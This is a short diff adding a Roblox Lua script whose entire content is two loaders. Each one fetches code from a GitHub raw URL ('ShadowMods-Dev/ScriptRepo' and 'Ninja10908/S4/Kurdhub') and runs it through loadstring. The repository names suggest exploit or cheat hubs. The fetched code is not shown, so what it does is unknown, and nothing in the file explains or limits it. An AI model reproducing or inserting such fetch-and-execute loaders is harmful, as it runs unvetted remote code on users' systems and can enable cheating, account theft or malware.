@@ -1,0 +1,7 @@
+task.spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ShadowMods-Dev/ScriptRepo/refs/heads/main/upd-script"))()
+end)
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Ninja10908/S4/refs/heads/main/Kurdhub"))()
+end)
